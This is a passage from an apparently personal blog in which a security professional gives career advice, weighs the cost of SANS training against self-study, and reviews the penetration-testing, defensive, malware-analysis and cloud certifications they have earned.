aren‚Äôt sure exactly where you want to go, then don‚Äôt sweat it! Get a job anywhere in the infosec field (where you can), and try it out. Maybe you get a SIOC position or a compliance position and do that for a few months. If it‚Äôs interesting, pursue it further, if not, pivot somewhere else in the field. A lot of what you‚Äôll learn in one infosec sub-discipline transfers very nicely to any other role in infosec. Finally, feel free to check out my series of mini-reviews covering a large assortment of popular certification/trainings I have personally taken. None of these apply and you‚Äôre just interested in taking something new: If none of the scenarios really apply to you then maybe peruse my series of certification/training mini-reviews, take a look at the vast collection of online education resources or even reach out to me for more personalized recommendations! Thoughts on SANS Training and GIAC Certification ExamsGiven the overwhelming popularity and industry mind-share that this organization, as a security training provider has, coupled with the breadth/depth of experience I have taking their classes and acquiring their certifications, I wanted to take some time to share my perspective on SANS. I‚Äôll start by saying I have mixed feelings overall on SANS. I think their course material is top-notch, their instructors are world-class, industry-leaders and their network and reach (in terms of how well-known they are) is basically unrivaled. But‚Ä¶ they are simply too expensive of an option for most individuals paying out-of-pocket. Secondly, I believe that a sizable majority of the material provided in any given SANS training course is accessible (in some way) online, for free. You need only an Internet connection and the desire to do some research yourself to find it. If not immediately available online you can often find the material in a book or blog post or even a github repo likely also written by the author themselves! So what you are paying for isn‚Äôt necessarily the material (which again, is likely available open-source), rather you pay for by signing up for a SANS course is the convenience and the delivery format. From how I see things, the ingredients are all readily available. I compare SANS to going to a fancy restaurant and having a world-class chef prepare a meal for you - one you could have made with those same ingredients at home. With some practice, and most if not all of the same ingredients at your disposal, you too can feed your mind the same dish. Before I get into exactly how I would recommend you go about giving yourself a SANS education without ever attending a SANS course, let me qualify what I said above with two important points‚Ä¶ First, if you get the chance to attend a SANS course, paid-for by your employer, absolutely take them up on this offer. Though I do think in many cases you can replicate SANS course content with free or cheap resources online, actually attending a SANS course is an amazing opportunity and can provide the following‚Ä¶ Learn the material in a quicker, more direct fashion. Get immediate help on advanced topics from an industry expert. This can help you get over learning roadblocks faster than you may have otherwise been able to on your own. Network with like-minded individuals in your field as well as expert instructors. Obtain a certification that is highly regarded in the field and could help you with future job searches. Second, though it is becoming harder to recommend due to increasing cost (now $2500, where as only a year or two ago it was closer to $1000), participating in a SANS work study can give someone an avenue to attending a SANS training for much cheaper than the normal price (which is over $7000 and can even exceed $8000 after bundling the certification, on-demand materials, etc‚Ä¶). I‚Äôve facilitated on 4 separate occasions and can tell you that overall, it‚Äôs a pretty easy gig! You‚Äôre asked to assist with conference setup/teardown as well as some light operational tasking throughout each day (mainly fetching stuff for the instructor if needed and collecting the notorious daily SANS surveys). I think even at the new price, it is still (albeit barely) a decent value, especially for those who are maybe looking for that first cert. As a ‚Äúfirst cert‚Äù possibility, I think SANS is one of the best options for a candidate to make themselves stand out with respect to getting an entry-level position. Ok, so let‚Äôs say your employer won‚Äôt shell out the cash for a SANS training and you can‚Äôt either (nor have you had success getting into the work study). How can you give yourself a SANS-equivalent education yourself? Here‚Äôs what I would do‚Ä¶ First, figure out what you‚Äôre interested in via their Cyber Security Skills Roadmap. Figure out where you are technically or where you‚Äôd like to be and pick out the certification that is next in your path. Next, find the ‚ÄúCourse Syllabus‚Äù for the chosen course, for example, SEC560: Network Penetration Testing and Ethical Hacking. On this page, you can scroll down to the ‚ÄúSyllabus‚Äù section and see a relatively in-depth description of the topics covered during each day of the training for that course. Using this syllabus, you can build your own self-paced, self-taught curriculum, for free (or at-least on the cheap), online! Just google each topic and hunt for trainings/free content online related to that topic. I promise there is much more than you might think and you can find quite a bit of success with this method. This will require some determination, and is certainly more of a ‚ÄúTry Harder‚Äù (more on this in a bit) approach, but where money is short, I believe you can make up for it in this way. If you‚Äôre having trouble finding resources online, check out my list of education resources! Certification and Training Mini-ReviewsHaving taken and completed each of the trainings/certifications below, I wanted to provide a quick ‚Äúreview‚Äù of what I thought of each course. The reviews aren‚Äôt meant to summarize what is covered in these courses but rather give my thoughts on the value of each as well as recommendations or advice for those potentially interested in taking them. These are point-in-time assessments and as such can not reflect any updates to the material since the time I took it.

Instead, Tenable has established the Tenable University which is home to a number of online courses covering an assortment of topics related to Vulnerability Management as well as courses covering the use/engineering of their suite of tools (namely, Nessus, Tenable. io and Tenable. sc). What‚Äôs more, they even offer certifications you can quickly pick up and put on your resume, all for free! For anyone looking to break into the infosec field or get more into vulnerability management, penetration testing, or offensive security in general, I highly recommend getting into this alternate material. I personally got my start in the technical information security space via Vulnerability Management and attribute my success in large part to what I learned specializing in this area. Every organization is (or should be) doing some form ofVulnerability Management or network vulnerability scanning which means no matter where you go with these skills you will have relevant, applicable experience. I also believe that having a robust understanding of vulnerabilities is useful in just about any infosec sub-discipline. Compliance pros need to understand risk, and vulnerabilities represent a large swath of an organizations technical risk-surface. Penetration testers obviously need to understand vulnerabilities as they are typically taking advantage of them as part of their daily job! ‚ÄúBlue-teamers‚Äù (e. g. incident responders, forensics, threat hunters, network analysts, etc‚Ä¶) need to understand vulnerabilities since these are generally the soft spots in a network or on a system that the ‚Äúbad guys‚Äù are targeting. Understanding how vulnerabilities manifest themselves, the consequence(s) of exploitation and how to mitigate them is critical for defensive security professionals as well. Core Impact Certified Professional (CICP), Core Security: Attended: April 2016, CICP Obtained: April 2016 For a brief period of time I got to play around with the powerful (and expensive) Core Impact exploitation framework. During this time, I traveled to Core Security HQ to take the Core Impact training course, the CICP. Core Impact is a mature, and relatively intuitive tool. This makes user-training (in my opinion) mostly unnecessary. To be clear, this training is centered around using the tool, as opposed to actual technical network penetration or exploitation methodology. Save the trip, save the money, this training is not something I would recommend. SEC560: Network Penetration Testing and Ethical Hacking (GPEN), SANS: Attended: April 2016, GPEN Obtained: April 2016 SANS‚Äô intro to penetration testing course is SEC560. The course has evolved quite a bit since I took it in 2016 so I won‚Äôt speak in-depth to what is covered. For that sort of thing, just search online to find more in-depth reviews of the course material. With this said, taking a look at the most up-to-date syllabus you‚Äôll find that this course is chock-full of valuable penetration testing knowledge covering a wide-array of critical pentesting concepts including network reconnaissance, writing reports, scoping engagements, Nmap, Nessus, PowerShell, Metasploit, Veil, Pivoting, Empire, John, Mimikatz, Hydra, Kerberos, Responder, Bloodhound, ZAP, SQLi and more! Despite the material being quite sound in its overall coverage and depth, I believe the format is not ideal for actually learning penetration testing. I say this because penetration testing, especially as someone new to it, is likely dominated by a lot of trial and error. What this means is that you need a lot of time to try something, see if it works, learn why it didn‚Äôt and then try again. In other words, having time to fail and in some cases fail a lot, is very valuable. The pace in which SANS courses are conducted is not conducive to this method of learning. The format for labs is a series of individual exercises whereby the student has (in my opinion) their hand held throughout, each step is explained to them in precise detail, the answer is provided in short-order and you are then quickly whisked away to the next part of the lecture. SANS does give you the option during these labs to ‚Äúnot skip ahead‚Äù and see the answer(s) but in reality you likely won‚Äôt have time to take this figure-it-out-yourself approach. Being spoon-fed information in this manner is an OK way to be introduced to a technique or tool but I feel that later, when you attempt to exercise this knowledge in a practical setting you will likely feel unprepared having not actually practiced what you had learned in any meaningful way. As for the certification, I think it has some benefit on a resume as I have seen plenty of job reqs asking for it. BUT! If you are taking this course you are probably interested in getting a job as an actual penetration tester and as such, I would argue that a lot of companies actually hiring penetration testers are looking for proof the candidate actually has some real, practical, more-robust, hands-on experience which you really just can‚Äôt get with this training in it‚Äôs current form. For these reasons, I wouldn‚Äôt recommend this course. With this said, SANS is slowly moving their certification exams to a slightly more practical format. I think this will help with the way those in the field perceive these certifications, especially compared to their more ‚Äúpractical‚Äù brethren such as the OSCP. Certified Information System Security Professional (CISSP), ISC2: CISSP Obtained: March 2016 Love it or hate it, the CISSP remains one of the industries most recognized and sought after certifications. Those who hold the cert tend to command high salaries and from what I‚Äôve seen, it seems to just make you more hirable in general. No, it‚Äôs not a practical cert and yes, taking the exam is kind of grueling but if you meet the pre-requisite qualifications, I definitely recommend going for it. I recommend picking up a CISSP study-book on Amazon (back when I took it I used whatever the latest Shon Harris all-in-one guide was available) rather than signing up for some expensive boot camp. The exam has undergone some drastic changes since I sat for it in 2016, now being only 3 hours (versus 6) and only have between 100-150 questions (which is far less than previous versions). This shortened format will definitely help those who would normally experience fatigue taking such a long exam. This being said, I will warn you that with less questions comes more weight with each question, so you must exercise a little more care with each question as any incorrect answer will count against you more. When I took the exam i found many questions to be worded poorly (as if not written by a native English speaker) and I often found scenario-based questions to be highly subjective, often looking for the ‚Äúbest‚Äù of several seemingly-equally-correct answers. This is one reason I recommend finding an ‚Äúofficial‚Äù study-guide and reading through it as part of your overall studying regimen, remembering to take any available practice tests that are contained in the book. I found, by reading through these guides, that there was a certain ‚ÄúCISSP‚Äù way of answering questions. This way of thinking, when applied to these scenario-based questions will more-often yield the correct answer then if you were to approach it from what I would consider a non-biased point of view. For example, there might be a question that asks you something like ‚ÄúAs a security manager for a large banking organization, what is your highest priority?‚Äù. It will then list a number of possible answers, each of which seems potentially viable but one of the answers will be something about the ‚Äúphysical safety of the employees‚Äù. Of course the CISSP training wants to drill into your head that human safety is priority number one! Even if that seems somewhat irrelevant to an exam about Cybersecurity. Given the high demand for CISSP-certified professionals, especially in certain job markets, it‚Äôs no surprise there are a lot of people, especially those more junior in the field, asking about and looking to take this exam. ISC2 requires those who sit for the exam to have a minimum of 5 years of (relevant) experience (or optionally 4 years plus a relevant degree) and I think this makes sense. It certainly made my test-taking experience much smoother having this experience to lean on than if i had tried to power-study for it early in my career, having not truly understood and practiced the concepts in a real-world setting. Adding to this, I think I greatly benefited in having an extended background in the ‚Äúsofter‚Äù side of security (policy &amp; compliance) early in my career coupled with a recent history in the more technical aspects of infosec. As a certification that attempts to cover basically ‚Äúall of security‚Äù, it shouldn‚Äôt come as a surprise that having a well-rounded experience would lend itself to being more successful with the exam. To wrap this up, let me just summarize again by saying that I think experience, more so than just remembering facts is particularly useful with this certification (I say this relative to other certification exams where I do think you can be successful just cramming facts into your head) given the nature of the scenario-based questions that are asked. Penetration Testing Student (eJPT), eLearnSecurity: eJPT Obtained: December 2016 The PTS from eLearnSecurity is a relatively limited in scope, yet high-value course. With hours of video lectures, practical VPN-based labs and a self-paced style, I found it a really good format for learning this sort of technical material. What‚Äôs even better is this course can often be taken for FREE, as eLearnSecurity has frequently given out vouchers for the course as part of different promotions or for something as simple as attending a free webinar (note that the exam attempt is not typically included with this free voucher). Where you can pick up a free voucher, I definitely recommend going through the material, especially as a beginner. Otherwise, this course clocks in at about $400 and in this case I just don‚Äôt really recommend it. Again, I think the material is great, but I think your money is better spent on a more comprehensive course like eLearnSecurity‚Äôs PTP course or the OSCP. In the end, having ‚ÄúPenetration Testing Student‚Äù training or a certification titled ‚ÄúJunior Penetration Tester‚Äù from the lesser known eLearnSecurity on your resume is not likely to turn a lot of hiring manager/recruiter heads. You‚Äôll also get a far better curriculum by just spending your money on the more serious courses. Penetration Testing Professional (eCPPT), eLearnSecurity: eCPPT Obtained: February 2017 The PTP is a fantastic offering from the not-so-well-known online training provider eLearnSecurity. This course can be thought of as eLearn‚Äôs direct competitor to the much more well-known OSCP certification from Offensive Security. The PTP course covers a lot of technical ground including assemblers/debuggers, shellcoding, network pentesting, PowerShell, Linux exploitation, web apps, WiFi hacking and even has an in-depth ruby for pentesters module. The course material certainly shines in certain spots relative to the OSCP - modules on PowerShell, WiFI security and Ruby are not be found in the PWK curriculum (last I checked). The decision to take the PTP course is likely not made without asking, why should I take this over the PWK/OSCP? I‚Äôll attempt to make the case for both of these courses, providing my thoughts on each, below. One of the biggest differences between the PTP and the OSCP in my opinion is the expectations of the student. OSCP is (in)famous for forcing its ‚ÄúTry Harder‚Äù mentality whereas the PTP takes a different approach. With the PTP, and similarly with other courses offered by eLearn, students are provided focused labs where the student can practice specific skills and techniques, taking a lot of the guesswork and trial-n-error out of the equation. I do think that this approach is a little ‚Äúhand-holdy‚Äù which I believe can be detrimental to full absorption of the concepts. I found that I failed less in achieving the desired outcome within these labs and as a result learned less about the ways things didn‚Äôt work. Though ultimately far more frustrating, there is a method-to-the-madness with the OSCP approach. Where you are forced to figure it out yourself, I believe you really will learn the material in a much more robust way. You‚Äôll also, as a consequence of having to ‚Äútry harder‚Äù, frequently end up down rabbit holes where you learn all sorts of stuff that doesn‚Äôt end up being applicable to your ultimate solution, but its gained knowledge all the same. All this said, I think the eLearn approach might be better suited to my personal learning style. The PTP lab environment, which is essentially a series of individual exercises, each with specific lab systems for that exercise, is a less realistic method of practicing penetration testing techniques as compared to the PWK/OSCP. The PWK/OSCP sports a large, open, multi-layered, ‚Äúwild-west‚Äù-style lab network, comprised of many different interconnected systems. Having a large heterogenous network such as this is more realistic in terms of simulating an actual network. Where I think the PTP gains back ground on the OSCP is that the exercises/content/exam is (in my opinion) far more modern. Specifically, you do a lot of hackery in a Windows Active Directory environment with the PTP which I found lacking in the OSCP. Finally, I think the PTP exam unlike the OSCP exam, is a better representation of a realistic (albeit mini-) network in which you need to compromise. This is a little funny considering the OSCP had the far more realistic lab setting but when it comes to the exam they seem to regress. The OSCP is essentially just a series of 5 CTF boxes whereas the PTP requires breaching a machine in a ‚ÄúDMZ‚Äù, then pivoting into other internal networks and performing subsequent exploitation. So here‚Äôs where I stand on PTP vs OSCP: It‚Äôs difficult to recommend one over the other as they both have certain strengths and weaknesses. I recommend the PTP for its sheer breadth of awesome material, which is brought more directly to you rather than having to find it yourself. I also think the PTP exam better exercises your ability to do real penetration testing given you actually have to do pivoting (among other things not experienced during the OSCP exam). Another example of how I think the PTP exam excels over the OSCP is the duration and reporting aspect of these exams. It‚Äôs not terribly realistic that you would be asked to do a penetration test in 24 hours followed by delivering a full report after an additional 24 hours (which is what is asked of you in the OSCP). In my experience, you will have more time to perform the engagement and provide the deliverables. As such, the PTP exam is a week long, with an additional week to provide the report. I do think the PTP is a great complement to the OSCP though, rather than a ‚Äúchoose one or the other‚Äù. However if you can only choose one, I would still ultimately give the edge to the OSCP. The huge lab environment is both challenging and exhilarating - an amazing playground for an offensive student. Though I think the material is a bit outdated, I think the most important thing taught by the OSCP is the mentality and methodology. You learn, by trying harder (and enumerating a lot), a more realistic way to breach systems and networks. The experience of failure and the determination you must bring to the OSCP fight can‚Äôt be understated and it is absolutely a skill you‚Äôll need for real-life penetration testing. Also, and this is probably the most important point, the OSCP is (currently) the far more recognized and sought after certification by hiring managers and recruiters. That alone is reason enough to choose the OSCP over the PTP. SEC503: Intrusion Detection In-Depth (GCIA), SANS: Attended: March 2017, GCIA Obtained: July 2017 Generally speaking, I probably wouldn‚Äôt recommend most 500-level SANS courses. They‚Äôre expensive and I personally believe you can find most if not all of what is covered in the course searching online. With that said, I think SEC503 could be the exception to that rule. Yes, I still think you can find a good bit of this material online, but I think in this case it would be far more difficult to self-administer it. This course, an undeniably ‚Äúblue‚Äù / defensive security course, which preps you for the GCIA exam is by far my favorite SANS course that I have taken - and this is coming from someone who is an offensive security specialist by trade! I credit my infatuation with the course to the following three points. At the time I took this training, TCP/IP and general networking concepts were weaker knowledge areas for me, so I really just learned SO MUCH during this course. Much of my early technical focus was on web applications or using certain tools for network penetration testing. I glossed over in those early times, the importance of understanding what is happening at layers 2-4. This course cleared that up for me and then some. This course has two distinct sections (spread out over the course of 5 days of lecture) - traffic analysis and then tooling. As someone more on the ‚Äúoffensive‚Äù side, my need to (or desire to) understand a lot of the defensive tooling was certainly minimized back then. Where I found the extreme value, was days one and two where you go deep (and I mean DEEP!) into traffic analysis, packet dissection, understanding of protocols, etc‚Ä¶ It is an undeniably dense and information-packed two days but I think one of the best two days of learning I have ever experienced. As for the final 3 days, though I didn‚Äôt appreciate it as much then, I now have a much greater appreciation for what was covered. This is a great example of how I discounted certain things early in my career because I didn‚Äôt think it was relevant to where I wanted to go professionally. Years later I can see that even as an ‚Äúoffensive specialist‚Äù understanding exactly how defender tools (e. g. Snort, Bro/Zeek, SIEMs, SiLK, NetFlow, etc‚Ä¶) work is extremely important. Whether this be because you are trying to bypass these tools or you are looking to set them up in a home/test lab so you can practice against them - it‚Äôs good to know how they work. What‚Äôs more, I have found that slotting in, in a perfect, exclusively ‚Äúoffensive‚Äù role, where all I do is pentest or red team is easier said than done. More likely, at least in my experience, is you‚Äôll need to have experience (especially in an engineering capacity) with tools across the security space, from red to blue. The material for this training is fantastic and I think a little more challenging to find for yourself online then perhaps other courses. Sure you could buy yourself a book on TCP/IP, this of course would be a perfectly acceptable approach to learning some of this material! But, I think the the course content has been perfectly cropped here for both offensive and defensive security professionals alike to get a firm understanding of how to interpret network traffic and leverage a number of well-known industry tools. My instructor for the course was Jonathan Ham. He did such an outstanding job making something as seemingly dry as in-depth packet analysis so interesting. I still think spending $7000+ is not worth it for any individual paying out-of-pocket but if you do get a chance to take a SANS cert through work, desperately want to pay for a SANS cert yourself or maybe you get accepted to a SANS workstudy, I would highly recommend taking a look at this one. SEC573: Automating Information Security with Python (GPYC), SANS: Attended: May 2017, GPYC Obtained: August 2017 Do not spend money on this course. Don‚Äôt even let your company spend money on this course. This course isn‚Äôt meant to be an ‚Äúintroduction to python‚Äù, yet they spend two straight days painstakingly explaining the basics. For anyone who has even mild experience with Python, this is excruciating. After the first two days, the material definitely gets more interesting, but nothing is covered in these final modules that isn‚Äôt equally covered in any number of very cheap books. The book Violent Python is actually handed out in the class (as part of your $7k+ tuition) and has plenty of what is covered in those final three days of lecture. Do yourself a favor and just Google ‚Äúlearn python‚Äù and follow a few of the online tutorials. This should satisfy the basics requirement (what is covered in days 1 and 2). From there, buy a ‚Äúpython hacking‚Äù book or two (e. g. The Violent Python book, Black Hat Python, Gray Hat Python, etc‚Ä¶) to learn how to use cool security-related modules (e. g. requests, scapy, struct, sockets, etc‚Ä¶). Here is an assortment of other books that you can use to teach yourself Python. Just please, don‚Äôt spend money on this course. SEC575: Mobile Device Security and Ethical Hacking (GMOB), SANS: Attended: October 2017, GMOB Obtained: December 2017 I don‚Äôt recommend recommend taking this course. The material is interesting enough but it suffers from the pace in which the mobile world moves. Given the speed in which features are added to the iOS and Android platforms it is difficult to maintain a cutting-edge mobile device hacking course - and it shows. What‚Äôs more, its difficult to really demonstrate iOS security concepts given how locked down the platform is and how uncertain it is whether there will be an active Jailbreak (which can be used to install iOS-related security tools and demonstrate other security things). For this reason, this course centers mostly around the Android platform. To this course‚Äôs credit though, I did find it pretty cool how much more approachable mobile device hacking/security was than I had imagined. I think this course is one of SANS‚Äô more neglected offerings in terms of how frequently it is updated and that‚Äôs too bad considering how mobile devices have become more a part of everyone‚Äôs daily computing lives. Offensive Security Certified Professional (OSCP): OSCP Obtained: July 2018 I provide some details on the OSCP in my review of eLearnSecurity‚Äôs PTP course, but I will expand on the (PWK) course more here. First, let me say that I highly recommend this course for all security professionals. I think this is an obvious choice for those looking to get into penetration testing and I would even recommend those in ‚Äúdefensive‚Äù security positions take a look at this course. After all, what better way to understand how to defend then understanding how your systems may be attacked! Ok, so you don‚Äôt really need me to tell you that the OSCP is a great certification and the PWK is an excellent course, nor do you really need yet another full OSCP review. After all, there are TONS of reviews already out there. Instead, let me list a few thoughts and pieces of advice I have related to the OSCP. The exam (mostly) forbids the use of exploit frameworks such as Metasploit or vulnerability scanners such as Nessus. Many OSCP students take this as a cue to try and get through the entire lab without the use of these sorts of tools. I don‚Äôt recommend this. Not because Metasploit or Nessus or similar tools are so useful that they will give you a serious leg up but rather these tools are good to know how to use in general! Why not take the time to learn how to use them? The lab is a fantastic place to try your hand with all sorts of tools and techniques so you should really take full advantage. To compensate however, where you did leverage a tool like Metasploit or Nessus, figure out how you would have exploited a system, or enumerated a system in the absence of these tools. In this way, you‚Äôll still feel fully comfortable come exam time. Don‚Äôt NOT use them just because the exam dictates you can‚Äôt. As a clarification, the OSCP (at least when I took it) allowed the use of ONE metasploit module (so fire wisely). It also allows you to use the Metasploit session management features (i. e. multi-handler), with no limits. The PWK lab has a LOT of vulnerable systems, it‚Äôs important that you manage and maintain records of what you‚Äôve found on each of these systems including open ports, credentials and other important artifacts. There are any number of tools/methodologies that can assist in this endeavor but I recommend you take a look at the MSFDB functionality offered natively by Metasploit. This can help you keep track of things. Take screenshots! Lots of screenshots! You‚Äôll need this for the lab report, you‚Äôll need it for the exam report, you‚Äôll need it for future professional penetration test reports. Screenshots are good, get used to taking them. I recommend going through BOTH the PWK PDF and the videos before seriously getting into the lab itself. This is what I did and I found it more comforting to know what Offsec wanted me to know vs what I needed to hunt for myself (as part of their ever-so-fun game of ‚Äútry harder‚Äù). The exam does not require any pivoting. You should absolutely practice this in the lab but won‚Äôt need it come test time. Don‚Äôt worry about pwning every box in the lab. Getting through X amount of boxes isn‚Äôt a sign that you are ready. I got through about 30 which was more than enough! I think the OSCP is mostly a positive experience but I do think that it is very ‚ÄúCTF‚Äù-ey. Which is to say, less like hacking a real modern network and more like doing a series of hack-the-box challenges. Make the most of it though! It can be really fun if you‚Äôre in the mindset of learning rather than just ‚Äúgetting the cert‚Äù. SEC504: Hacker Tools, Techniques, Exploits and Incident Handling (GCIH), SANS: GCIH Obtained: December 2018 SEC504 is SANS most popular course. It is designed to be approachable for both semi-experienced professionals as well as to those new to the field and covers both offensive and defensive security domains. I did not actually take the course but I did challenge the GCIH exam which accompanies the course. Personally (and again, I did not actually take the course), I would not recommend this course as I think it tries to cover too much ground in too short of time. The course attempts to cover network attacks, incident handling, memory analysis, malware investigations, offensive tooling, network analysis, physical security, network scanning AND web application attacks‚Ä¶ all in 6 days. You get a brief intro to each of these topics (the course does have a day with a heavy focus in Incident Handling) but I don‚Äôt think it covers any of them at the depth you would want given you payed $7000+ to take the course. Of course given its popularity, if getting this cert helps you land a specific entry-level position, then absolutely go for it! SEC401: Security Essentials (GSEC), SANS: GSEC Obtained: February 2019 SEC401 is SANS‚Äô ‚Äúmile wide and an inch deep‚Äù course. I like to compare its accompanying cert, the GSEC, to the popular ISC2 CISSP certification (which I also have some thoughts on). I did not actually take this course but I did challenge the GSEC exam. Given the price, I don‚Äôt think I can really recommend this course. If you‚Äôre interested in getting a lay-of-the-(infosec)-land, I recommend looking into some free ‚Äúintro to security‚Äù courses online or even looking at study books for the Security+ or CISSP. Either of these should get you acquainted enough with the foundational concepts of information security. Both of these (CISSP and Sec+) are also great (cheaper) options for a certification well-respected in the industry. The GSEC certification I don‚Äôt think is going to move the needle on impressing any recruiters (no more than the Sec+ or CISSP that is) and the course material is probably easy enough to find online or via some cheap text books. SEC542: Web App Penetration Testing and Ethical Hacking (GWAPT), SANS: GWAPT Obtained: March 2019 This course is an introduction to web-application-specific penetration testing. I did not take the course but I did challenge the accompanying GWAPT certification exam. Similar to my GPEN review, I don‚Äôt recommend this course as it doesn‚Äôt provide a format conducive to really learning penetration testing. For learning penetration testing, I would recommend a more practical approach. Not that SANS doesn‚Äôt have practical exercises and in-training labs, it‚Äôs just that these labs fly by so quickly during the course of the training that you really don‚Äôt have time to fail, and failing is a great way to learn. Instead I would recommend a more practical course such as the eLearnSecurity WAPT course. With the current popularity of ‚Äúbug bounty hunting‚Äù and penetration testing in general, there is certainly an abundance of free or cheap web-application hacking training material out there. The Web Security Academy from the famed PortSwigger (creator of Burp Suite) is just one example of this. More examples of free/cheap online training material for web application penetration testing can be found in my guide to free/online training! FOR610: Reverse-Engineering Malware (GREM), SANS: Attended: May 2019, GREM Obtained: July 2019 I think this course is fantastic! I took this course prior to it‚Äôs adoption of Ghidra so I can‚Äôt speak for the new content but the instructors do a fantastic job getting through some of the trickier concepts (even for those new to the world of reverse-engineering). Unlike other SANS courses, especially penetration testing courses, I felt by the end of this training I could actually do real-world, practical, malware reverse-engineering. I should mention that prior to taking the course, I did have some background in assembly language and reverse-engineering but I still feel that anyone who dutifully gets through all of the material in this class could similarly feel ready to do some real malware reversing. For anyone interested in getting into malware reverse-engineering, I definitely recommend checking this course out. Paying full price for this class however is where I would be a little hesitant to recommend as I do think there are cheaper options out there. I want to reemphasize here that you‚Äôre probably best set up to succeed having a little knowledge about assembly (specifically Intel assembly) prior to sitting for this course. This isn‚Äôt explicitly listed on the ‚ÄúPrerequisites‚Äù section for the course by SANS but having taken this class with a coworker who did not have much experience in this area, watching some of their struggles really emphasized this point. Check out my primer on intel assembly or dive right into Intel‚Äôs own manuals if you are interested in getting prepped! ICS515: ICS Active Defense and Incident Response (GRID), SANS: Attended: July 2019, GRID Obtained: November 2019 SANS ICS515 is a bit of a niche course, covering incident response techniques as well as knowledge and tooling specific to OT environments. First, I‚Äôll say I probably wouldn‚Äôt recommend spending (your own) money on this course. At the point in which I took this course I had already taken 10+ SANS courses and as such, found that this course had a lot of similarities, things seemingly plucked from each of these other courses and made available in this course, albeit with a distinct ICS-flavor. There is a section on asset discovery and network security monitoring (NSM), reminiscent of both the SANS SEC460 and SANS SEC503 courses. There is a section on Incident Response, which echoes material taught in SANS SEC504. There is a section titled ‚ÄúThreat and Environment Manipulation‚Äù which focuses on ICS malware case-studies as well as malware analysis. This section contains plenty of material from SANS FOR610. The newest content to me (having not taken a course related to it) was covered in day one of the course, focusing specifically on ‚ÄúThreat Intelligence‚Äù. Though SANS also has a course dedicated to threat intelligence, I found this introduction to threat intel, as applied to ICS environments a good primer on the subject, covering the (ICS) Cyber Kill Chain, Active Defense, Intelligence Life-Cycle, Diamond Model and more. Overall, my biggest takeaways from this course were from this first day but having a unique interest in ICS security, I found the entire course pretty fascinating, despite a lot of the material being a rehash of similar content from other courses. SEC660: Advanced Penetration Testing, Exploit Writing and Ethical Hacking (GXPN), SANS: Attended: November 2019, GXPN Obtained: August 2020 SEC660 is SANS advanced penetration testing and intro to exploit writing course. I will echo what I have said about other SANS penetration testing courses and say that I don‚Äôt think that the format of this course is ideal for teaching penetration testing. Rapidly going lab-to-lab and lecture-to-lecture, with little time to actually practice the offensive techniques is not a great way to really learn and practice penetration testing. With that said, I do think the topics covered are really good with respect to the more advanced types of network pentesting. Where this class shines in particular is the final two days where you break into exploit writing for both Linux and Windows. Though I think the exercises are a little limited, I do think they are a great introduction to the world of exploit development for these respective platforms. I think for those interested in getting into exploit development, this is a decent place to start (though it is, as usual with SANS, an expensive option). With this said, I think ‚Äúadvanced network penetration testing‚Äù and ‚Äúexploit development‚Äù are really two different disciplines and SANS may have been better served to separate them into two distinct courses. I think a lot of professional penetration testers don‚Äôt need to have exploit writing skills and vice versa. In the overwhelming majority of penetration testing engagements, you likely don‚Äôt have time to write your own exploits or find zero-days. Conversely though, understanding already-written exploits and thus being able to modify exploit code on the fly is a great skill for your average penetration tester. As part of this ‚Äúmini-review‚Äù, I wanted to share some thoughts on the ‚Äúpractical‚Äù portions of the GXPN exam. Prior to taking on this course, and during the prep-time for the certification, the (partial) practical nature of this certification was something that was always on my mind. It certainly changed the way I prepared for the exam since I knew I‚Äôd need to actually put my knowledge to actual use, rather than simply regurgitate/recall random facts/concepts as is the case with most other GIAC exams. This exam, unlike most GIAC exams (though they are moving more exams to this partially-practical format) has a small number of questions (6 in my case) which require actually remoting into a lab environment and doing some sort of actual ‚Äúhacking‚Äù relevant to the course material. Knowing this, I spent much more time than I had with previous certifications (the advanced nature of the material also was a factor for time-spent studying) prepping for the exam. I expected these questions to be difficult and to be centered primarily around the exploit development/reverse-engineering (the more challenging) aspects of the course. What I found was that neither of these things ended up being true (at least in my opinion/experience). The questions were straight-forward (which is not always the case with the multiple-choice, scenario based questions you often find on GIAC exams), relatively easy and did not take that long to complete. I also was surprised to see that the majority of the questions (atleast on my instance of the exam) were not actually related to days 5 and 6 (which cover exploit writing). It‚Äôs also important to note that for those questions that were covering days 5 and 6 material, none of them were particularly in-depth. Given the time-constrained nature of the exam, the exam authors can‚Äôt expect people to be putting together full ROP chains now can they!? In short, study the material, try to really grasp the concepts for the sake of grasping the concepts - but don‚Äôt sweat the practical exam questions, they aren‚Äôt that bad! SEC617: Wireless Penetration Testing and Ethical Hacking (GAWN), SANS: GAWN Obtained: November 2020 SANS‚Äô advanced wireless penetration testing course offers an amazingly practical introduction to an array of RF technologies and how you can exploit them. This training covers traditional WiFi, DECT, ZigBee, a couple Bluetooth variants, RFID, NFC and even Software Defined Radio (at a high level). Included with the expectedly high entry fee is a box - yes, an entire BOX! - of cool hacking gadgets to use throughout the various hands on labs - bluetooth dongles, SDR, a Raspberry Pi, RFID badge cloner and more‚Ä¶ Unfortunately for me, I took this class in 2020 - best known for being an amazingly crappy year on a global level and more specifically, infamous for the global Covid-19 pandemic. For me, this meant taking the class via SANS On-Demand. Up until then, I had never taken an on-demand course from SANS, opting instead for in-person trainings for each of the courses I had taken prior. In a vacuum, I found the on-demand format to be pretty good. The physical books are mailed to you as well as available via your SANS portal as a digital . PDF and the video lectures are pre-recorded, typically by the course author themselves as well as downloadable so you can watch them anywhere. Where the on-demand format falls short, especially for this course is with labs. In typical a classroom setting, the instructor will have set up a physical lab environment in which the students can practice their hacking skills. With a class which requires an active medium (actual ZigBee buzzing around for example) in which to hack, which is not easily delivered in virtual form, the practical components of the course proved far more difficult to exercise. Ultimately, I do recommend this course for anyone looking to learn more about wireless hacking but I would advise that those interested hold off on taking the course until they are able to do so in a physical classroom setting. AWS Certified Solutions Architect Associate: Obtained: November 2020 With the help of the online training platform A Cloud Guru, I sat for and passed the AWS Certified Solutions Architect Associate exam. I give a lot of credit to this training platform for my success and would recommend others interested in taking this exam take a look at signing up. It‚Äôs not an overwhelmingly cheap service but it is far more economical than a lot of other training platforms (*cough* SANS *cough*) and the RoI on getting an AWS cert seems to be pretty high these days. The virtual video lectures provide both theoretical instruction as well as hands-on, practical labs that you can follow along with. The instructor, Ryan Kroonenburg, does a great job at walking you through the labs and alerting you if something you spin up in your AWS account would result in you seeing actual charges. The Solutions Architect curriculum is essentially just a high level speed-run of a large number of core AWS services (IAM, S3, EC2, RDS, VPC, ELB, SNS, SQS, Kinesis and Lambda to name a few of the big ones. ) You‚Äôre expected to know what each of these are at a relatively good technical depth, how they interact and when you would use each of them. The exam questions are mostly scenario-based and at times can be confusing and subjective though typically 